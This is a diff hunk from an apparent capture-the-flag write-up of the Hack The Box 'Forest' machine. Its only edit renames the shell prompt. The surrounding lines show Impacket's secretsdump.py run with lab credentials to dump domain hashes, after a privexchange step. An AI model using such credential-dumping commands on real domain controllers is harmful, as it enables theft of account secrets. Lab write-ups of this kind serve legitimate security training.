@@ -437,7 +437,7 @@ now visite http://localhost/privexchange.
 ```
 oket let run `secretsdump.py` again
 ```console
-kali@kali:/usr/share/doc/python3-impacket/examples$ sudo ./secretsdump.py -dc-ip forest.htb htb.local/kurohat:test1234@forest.htb
+bibo318@parrot:/usr/share/doc/python3-impacket/examples$ sudo ./secretsdump.py -dc-ip forest.htb htb.local/kurohat:test1234@forest.htb
 [sudo] password for kali: 
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
